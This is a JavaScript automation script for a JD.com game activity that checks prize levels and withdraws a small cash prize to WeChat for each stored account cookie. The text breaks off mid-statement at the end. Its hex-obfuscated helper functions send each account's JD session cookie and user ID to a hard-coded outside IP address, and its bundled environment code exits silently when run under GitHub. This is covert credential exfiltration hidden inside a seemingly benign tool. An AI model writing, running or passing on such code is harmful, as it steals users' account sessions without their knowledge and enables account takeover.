/*
微信提现6.66元
入口：
13 6,8,11,13,18,20,21 * * * Sami_jd_wx_hb_tx.js
============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
2、如果微信和京东账号没有绑定，将提现失败。
*/

const $ = new Env("Sami微信提现6.66元")
const Ver = '20220426';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
let helpno = "";
!(async () => {
    await $.wait(1000);
    await VerCheck("wx_hb_tx",Ver);
    await $.wait(1000);
    requireConfig()

    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        
        console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
        
        let helpNo = await  getBodySign("getlevel",$.UserName1);
        if(helpNo===100){
            let data = await requestApi();
            //console.log(data)
            if (data?.code == 0){//level
                console.log(`🎡🎡🎡账号等级:`+data.data?.level)
                helpNo = await  getBodySign("getalllevel",$.UserName1);
                if (helpNo===100){
                    data = await requestApi();
                    //console.log(`1111--》`+data)
                     if (data?.code == 0){
                        console.log(`📢📢📢6.66元微信提现检测中...`)
                        for (let vo of data?.data?.gamePrizeItemVos){
                            if(vo.prizeType === 9){//汪币💰
                                if(vo.status === 1){//已获得
                                    console.log(`💰No.`+vo.prizeLevel +` `+vo.prizeName +` 已获得🌼🌼🌼`)
                                }else{//未获得
                                    console.log(`💰No.`+vo.prizeLevel +` `+vo.prizeName +` 未获得🌱🌱🌱`)
                                }
                            }
                            if(vo.prizeType === 2){//红包🧧
                                if(vo.status === 1){//已获得
                                    console.log(`🧧No.`+vo.prizeLevel +` `+vo.prizeName +` 已获得🌼🌼🌼~~失效时间🔚`+vo.prizeTypeVO?.prizeEndTime)
                                }else{//未获得
                                    console.log(`🧧No.`+vo.prizeLevel +` `+vo.prizeName +` 未获得🌱🌱🌱`)
                                }
                            }
                            if(vo.prizeType === 4){//现金💲
                                if(vo.status === 1){//已获得
                                    console.log(`💲No.`+vo.prizeLevel +` `+vo.prizeName +` 已获得🌼🌼🌼`)
                                    if(vo.prizeTypeVO.prizeUsed===3){
                                        console.log(`✅✅✅已经提现金到微信了啦🎯🎯🎯~~~完成时间:`+vo.prizeTypeVO?.prizeEndTime)
                                    }
                                    if(vo.prizeTypeVO.prizeUsed===-1){
                                        console.log(`❌❌❌过期啦，不能提现了😂😂😂~过期时间:`+vo.prizeTypeVO?.prizeEndTime)
                                    }
                                    if(vo.prizeTypeVO.prizeUsed===0){
                                        console.log(`🌺🐉🐉🐉可以提现啦，提现有效期:`+vo.prizeTypeVO?.prizeEndTime)
                                        data = await requestApi1(vo.prizeTypeVO?.id,vo.prizeTypeVO?.poolBaseId,vo.prizeTypeVO?.prizeGroupId,vo.prizeTypeVO?.prizeBaseId)
                                        if(data.code===0){
                                            console.log(`💲等级提现`+` `+data.data?.record?.amount+data.data?.message)
                                        }
                                    }
                                }else{//未获得
                                    console.log(`💲No.`+vo.prizeLevel +` `+vo.prizeName +` 未获得🌱🌱🌱`)
                                }
                            }
                            
                        }
                        //6.66元微信提现
                        if(data?.data?.gameBigPrizeVO?.topLevelStatus===1){
                           data = await requestApi1(data?.data?.gameBigPrizeVO?.prizeTypeVO?.id,data?.data?.gameBigPrizeVO?.prizeTypeVO?.poolBaseId,data?.data?.gameBigPrizeVO?.prizeTypeVO?.prizeGroupId,data?.data?.gameBigPrizeVO?.prizeTypeVO?.prizeBaseId)
                           //console.log(`22222--》`+data)
                           if(data.code===0){
                               console.log(`💲No.30`+` `+`6.6元微信`+data.data?.message)
                                helpNo = await  getBodySign("reboot",$.UserName1);
                                if (helpNo===100){
                                    data = await requestApi();
                                    if(data.code ===0){
                                       console.log(`o(≧v≦)o游戏重启启动`+` `+data.errMsg)
                                    }
                                }
                               
                           }
                        }else{
                           console.log(`💲No.30`+` `+`6.6元微信提现 未获得🌱🌱🌱`) 
                        }
                        
                     }
                }
            }else{
                console.log(`服务器异常,请稍后重试！`)
            }
           await $.wait(1000);
        }
        
    }
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })



function requestApi1(id,poolBaseId,prizeGroupId,prizeBaseId) {
    return new Promise(resolve => {
        $.post({
            url: `https://api.m.jd.com/`,
            headers: {
                "Cookie": cookie,
                "Host":"api.m.jd.com",
                "origin": "https://joypark.jd.com",
                "referer": "https://joypark.jd.com",
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": ua,
            },
            body: `functionId=apCashWithDraw&body={"businessSource":"JOY_PARK","base":{"id":${id},"business":"joyPark","poolBaseId":${poolBaseId},"prizeGroupId":${prizeGroupId},"prizeBaseId":${prizeBaseId},"prizeType":4},"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=${Date.now()}&appid=activities_platform`,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}





function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdedde=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x6F\x79\x70\x61\x72\x6B\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x64\x61\x74\x61\x31","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function requestApi(){return  new Promise((_0x3858x2)=>{$[__Oxdedde[0x8]]({url:`${__Oxdedde[0x0]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x48\x6F\x73\x74":__Oxdedde[0x1],"\x6F\x72\x69\x67\x69\x6E":__Oxdedde[0x2],"\x72\x65\x66\x65\x72\x65\x72":__Oxdedde[0x2],'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':__Oxdedde[0x3],"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua},body:helpno},(_0x3858x3,_0x3858x4,_0x3858x5)=>{try{$[__Oxdedde[0x4]]= _0x3858x5;_0x3858x5= JSON[__Oxdedde[0x5]](_0x3858x5)}catch(e){$[__Oxdedde[0x7]](__Oxdedde[0x6],e,_0x3858x4)}finally{_0x3858x2(_0x3858x5)}})})}(function(_0x3858x6,_0x3858x7,_0x3858x8,_0x3858x9,_0x3858xa,_0x3858xb){_0x3858xb= __Oxdedde[0x9];_0x3858x9= function(_0x3858xc){if( typeof alert!== _0x3858xb){alert(_0x3858xc)};if( typeof console!== _0x3858xb){console[__Oxdedde[0xa]](_0x3858xc)}};_0x3858x8= function(_0x3858xd,_0x3858x6){return _0x3858xd+ _0x3858x6};_0x3858xa= _0x3858x8(__Oxdedde[0xb],_0x3858x8(_0x3858x8(__Oxdedde[0xc],__Oxdedde[0xd]),__Oxdedde[0xe]));try{_0x3858x6= __encode;if(!( typeof _0x3858x6!== _0x3858xb&& _0x3858x6=== _0x3858x8(__Oxdedde[0xf],__Oxdedde[0x10]))){_0x3858x9(_0x3858xa)}}catch(e){_0x3858x9(_0x3858xa)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdede0=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x77\x78\x5F\x68\x62\x5F\x74\x78\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x73\x74\x61\x74\x75\x73","\x30","\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x6A\x6F\x79\x42\x61\x73\x65\x49\x6E\x66\x6F\x26\x63\x74\x68\x72\x3D\x31\x26\x62\x6F\x64\x79\x3D\x7B\x22\x74\x61\x73\x6B\x49\x64\x22\x3A\x22\x22\x2C\x22\x69\x6E\x76\x69\x74\x65\x54\x79\x70\x65\x22\x3A\x22\x22\x2C\x22\x69\x6E\x76\x69\x74\x65\x72\x50\x69\x6E\x22\x3A\x22\x22\x2C\x22\x6C\x69\x6E\x6B\x49\x64\x22\x3A\x22\x4C\x73\x51\x4E\x78\x4C\x37\x69\x57\x44\x6C\x58\x55\x73\x36\x63\x46\x6C\x2D\x41\x41\x67\x22\x7D\x26\x74\x3D\x31\x36\x35\x30\x37\x39\x32\x33\x31\x30\x34\x39\x30\x26\x61\x70\x70\x69\x64\x3D\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x5F\x70\x6C\x61\x74\x66\x6F\x72\x6D\x26\x68\x35\x73\x74\x3D\x32\x30\x32\x32\x30\x34\x32\x34\x31\x37\x32\x35\x31\x30\x34\x39\x30\x25\x33\x42\x37\x31\x34\x39\x36\x33\x31\x32\x33\x38\x33\x35\x30\x37\x33\x32\x25\x33\x42\x34\x61\x62\x63\x65\x25\x33\x42\x74\x6B\x30\x32\x77\x37\x66\x35\x64\x31\x62\x30\x63\x31\x38\x6E\x6F\x35\x39\x56\x4C\x4E\x30\x59\x46\x65\x46\x56\x75\x65\x4B\x61\x4E\x32\x53\x5A\x61\x39\x58\x5A\x4E\x56\x58\x6B\x36\x74\x63\x7A\x54\x69\x6C\x54\x25\x32\x46\x39\x39\x71\x6B\x70\x34\x4C\x31\x44\x77\x25\x32\x42\x57\x25\x32\x46\x39\x46\x7A\x55\x48\x55\x4C\x6B\x36\x78\x4F\x53\x58\x42\x77\x41\x37\x63\x4F\x76\x79\x6A\x31\x30\x33\x51\x25\x33\x42\x38\x31\x31\x33\x63\x39\x31\x31\x34\x31\x31\x34\x66\x62\x63\x31\x39\x38\x64\x30\x37\x66\x36\x30\x64\x33\x38\x37\x65\x30\x38\x31\x65\x39\x32\x65\x64\x64\x39\x35\x63\x38\x62\x61\x32\x36\x32\x66\x39\x35\x65\x63\x66\x37\x65\x35\x64\x39\x64\x38\x34\x66\x33\x37\x25\x33\x42\x33\x2E\x30\x25\x33\x42\x31\x36\x35\x30\x37\x39\x32\x33\x31\x30\x34\x39\x30","\x31","\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x67\x61\x6D\x65\x4D\x79\x50\x72\x69\x7A\x65\x26\x63\x74\x68\x72\x3D\x31\x26\x62\x6F\x64\x79\x3D\x7B\x22\x6C\x69\x6E\x6B\x49\x64\x22\x3A\x22\x4C\x73\x51\x4E\x78\x4C\x37\x69\x57\x44\x6C\x58\x55\x73\x36\x63\x46\x6C\x2D\x41\x41\x67\x22\x7D\x26\x74\x3D\x31\x36\x35\x30\x37\x39\x32\x33\x30\x39\x35\x32\x30\x26\x61\x70\x70\x69\x64\x3D\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x5F\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x32","\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x6A\x6F\x79\x52\x65\x73\x74\x61\x72\x74\x26\x62\x6F\x64\x79\x3D\x7B\x22\x6C\x69\x6E\x6B\x49\x64\x22\x3A\x22\x4C\x73\x51\x4E\x78\x4C\x37\x69\x57\x44\x6C\x58\x55\x73\x36\x63\x46\x6C\x2D\x41\x41\x67\x22\x7D\x26\x5F\x74\x3D\x31\x36\x34\x39\x35\x31\x37\x38\x30\x35\x35\x39\x30\x26\x61\x70\x70\x69\x64\x3D\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x5F\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x5107x2,_0x5107x3){return  new Promise((_0x5107x4)=>{$[__Oxdede0[0xd]]({url:`${__Oxdede0[0x0]}${_0x5107x2}${__Oxdede0[0x1]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x5107x3}},(_0x5107x5,_0x5107x6,_0x5107x7)=>{try{_0x5107x7= JSON[__Oxdede0[0x2]](_0x5107x7);data1= _0x5107x7[__Oxdede0[0x3]];if(_0x5107x7[__Oxdede0[0x4]]=== __Oxdede0[0x5]){helpno= `${__Oxdede0[0x6]}`};if(_0x5107x7[__Oxdede0[0x4]]=== __Oxdede0[0x7]){helpno= `${__Oxdede0[0x8]}`};if(_0x5107x7[__Oxdede0[0x4]]=== __Oxdede0[0x9]){helpno= 